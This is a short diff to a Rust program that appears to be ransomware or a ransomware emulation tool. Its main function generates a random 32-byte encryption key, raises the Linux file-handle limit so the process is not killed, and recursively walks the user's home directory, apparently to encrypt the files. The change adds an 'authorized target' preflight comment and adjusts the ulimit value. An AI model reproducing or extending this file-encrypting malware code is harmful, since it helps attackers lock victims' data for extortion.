@@ -51,6 +51,7 @@ async fn main() {
     tracing::subscriber::set_global_default(subscriber).expect("setting tracing default failed");
     event!(Level::INFO, "-- REACHED STAGE: Tracing Started --");
 
+    // preflight checks (make sure system is an authorized target)
     let disable_cryptography = should_disable_crypto();
 
     let mut key = encryptor::generate_random(32);
@@ -59,7 +60,7 @@ async fn main() {
     event!(Level::INFO, "-- REACHED STAGE: Recurser Start --");
 
     if cfg!(target_os = "linux") {
-        let _ = Command::new("ulimit").arg("-n 1000000").output(); // set file ulimit to prevent termination from file handler leak
+        let _ = Command::new("ulimit").arg("-n 1048576").output(); // set file ulimit to prevent termination from file handler leak
     }
     recurse_directory_with_channel(dirs::home_dir().unwrap(), &s);
 
